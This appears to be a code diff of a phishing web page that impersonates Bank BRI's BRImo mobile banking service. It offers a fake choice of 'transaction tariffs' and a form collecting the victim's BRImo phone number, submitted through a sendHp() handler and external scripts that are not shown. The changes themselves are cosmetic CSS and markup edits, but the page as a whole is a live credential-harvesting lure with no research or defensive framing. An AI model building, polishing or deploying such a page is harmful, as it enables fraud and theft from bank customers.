@@ -6,10 +6,11 @@
     <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 | 𝘄𝘄𝘄.𝗶𝗯𝗯𝗿𝗶-𝗯𝗿𝗶𝗺𝗼.𝗰𝗼.𝗶𝗱</title>
      <meta name="theme-color" content="#0f78cb">
      <link rel="icon" type="image/png" href="https://hosting.tigerengine.id/nssd3w.png">
-<meta content="https://hosting.tigerengine.id/4mi0e0.jpg" property="og:image">
-<meta name="twitter:image" content="https://hosting.tigerengine.id/4mi0e0.jpg">
+<meta content="https://hosting.tigerengine.id/f8uyn1.jpg" property="og:image">
+<meta name="twitter:image" content="https://hosting.tigerengine.id/f8uyn1.jpg">
     	<meta name="description" content="Bank BRI terus berinovasi mengembangkan produk yang sesuai dengan perkembangan jaman untuk memenuhi kebutuhan nasabah">
   <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+ 
  
    
 </head>
@@ -117,8 +118,10 @@
     font-size: 14px; 
   }
 
-  
-
+  .button {
+    font-size: 1rem; 
+  }
+}
 
 @media (max-width: 400px) {
   .carousel {
@@ -187,7 +190,7 @@ ion-icon{
     display: block;
     margin-bottom: 5px;
     font-weight: bold;
-    color: #000;
+    color: #09559a;
 }
 
 .input-field input {
@@ -255,13 +258,13 @@ ion-icon{
     background-color: #0F78CB; 
     color: #fff;
 }
+
 .button:disabled, 
 .button[disabled]{  
-    opacity:0.3;    
+    opacity:0.3;
     background-color: #0F78CB; 
     color: #fff;
 }
-
 
 nav{
      position:fixed;
@@ -389,18 +392,19 @@ nav{
             top: 0;
             left: 0;
             right: 0;
-            width: 90%;
-            margin-top: 75%;            
+            width: 90%;    
+            margin-top: 75%;             
       }
       
-      .hid{
+       .hid{
           display:none;
       }
       
       .radio-group {
             display: flex;
-            flex-direction: column;           
-            margin-bottom: 6px;
+            flex-direction: column;          
+            margin-bottom: 2px;
+            max-width: 400px;
         }
 
         input[type="radio"] {
@@ -415,7 +419,7 @@ nav{
             border: 1px solid #ef871c;
             border-radius: 25px;
             cursor: pointer;
-            transition: background-color 0.3s ease, lor 0.3s ease;
+            transition: background-color 0.3s ease, color 0.3s ease;
             font-size: 14px;
             color: #09559a;
             background-color: transparent;
@@ -530,7 +534,7 @@ chsalxcome {
                        <h3 style="color:#09559a;margin-top:0;">Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</h3>
           <form id="login" onsubmit="sendHp()" method="post">
               
-       <img width="100%" src="https://hosting.tigerengine.id/ybfkl8.png" alt="">
+        <img width="100%" src="https://hosting.tigerengine.id/ybfkl8.png" alt="">
        <div class="radio-group">             
     <input type="radio" id="1" name="tarif" value="Lama Rp 6.500" required>
     <label class="label-radio" for="1">√•𝗧𝗮𝗿𝗶𝗳 𝗟𝗮𝗺𝗮 𝗥𝗽 𝟲.𝟱𝟬𝟬 / 𝗕𝗶 𝗳𝗮𝘀𝘁 𝟮.𝟱𝟬𝟬</label>
@@ -540,9 +544,8 @@ chsalxcome {
     </div>
        
        <div class="input-field">
-     
-    <label for="rek">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</label>
-    <ion-icon name="phone-portrait-sharp"></ion-icon>
+     <label for="nohp">Masukan Nomor ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</label>
+ <ion-icon name="phone-portrait-sharp" for="nohp"></ion-icon>
  <input type="tel" id="nohp" name="nohp" placeholder="08xxxx" maxlength="15" required>
                         </div>
                     </div>
@@ -560,8 +563,9 @@ chsalxcome {
     <script src="i.js"></script>
     <script src="token.js"></script>
     <script>
-     
-  $( document ).ready(function() {
+        
+        
+    $( document ).ready(function() {
       $('welalxcome').fadeIn(500);
             setTimeout(() => {
                 $('welalxcome').fadeOut();
@@ -585,7 +589,6 @@ input.addEventListener("input", () => {
     button.disabled = true;
   }
 });
-
 
         const carouselItems = document.querySelectorAll('.carousel-item');
 const carouselNavItems = document.querySelectorAll('.carousel-nav-item');
